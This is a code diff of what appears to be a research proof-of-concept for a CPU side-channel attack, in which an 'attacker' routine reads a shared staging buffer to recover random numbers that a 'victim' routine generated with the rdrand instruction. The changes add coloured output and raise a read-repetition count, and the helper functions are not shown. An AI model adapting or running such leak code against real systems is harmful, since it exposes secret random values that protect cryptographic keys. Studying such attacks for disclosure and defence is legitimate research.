@@ -21,7 +21,7 @@ void victim(int cpu, int reps, void *mem){
         usleep(CYCLE_LENGTH);
         uint64_t random_number;
         asm volatile("rdrand %0":"=r"(random_number):);
-        printf("[VICTIM]   Generated Random Number 0x%16lx\n", random_number);
+        printf("[\e[32mVICTIM\e[39m]   Generated Random Number \e[32m0x%16lx\e[39m\n", random_number);
         //fflush(stdout);
     }
     while(1);
@@ -43,12 +43,12 @@ void attacker(int reps){
         :::"eax");
         while (!rdrand_section_changed(mem, byte_32)){}
         uint64_t random_number = 0;
-        vector_read(mem, REPS*3, staging_buffer, 32, 40, 0);
+        vector_read(mem, REPS*5, staging_buffer, 32, 40, 0);
         for(int i = 0; i < 8; i++) {
             random_number = random_number << 8;
             random_number += staging_buffer[32 + (8 - i - 1)];
         }
-        printf("[ATTACKER] Recovered Random Number 0x%16lx\n", random_number);
+        printf("[\e[31mATTACKER\e[39m] Recovered Random Number \e[31m0x%16lx\e[39m\n", random_number);
         fflush(stdout);
     }
     munmap(mem-1, _page_size * 257);
